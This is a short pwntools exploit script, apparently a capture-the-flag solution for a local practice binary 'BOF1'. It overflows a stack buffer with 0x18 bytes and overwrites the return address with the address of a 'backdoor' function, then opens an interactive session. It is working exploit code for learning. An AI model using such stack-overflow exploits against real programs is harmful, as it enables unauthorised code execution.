from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

backdoor = 0x000000000401196 + 5

r = process('./BOF1')

r.sendlineafter(b': ', b'a' * 0x18 + p64(backdoor))

r.interactive()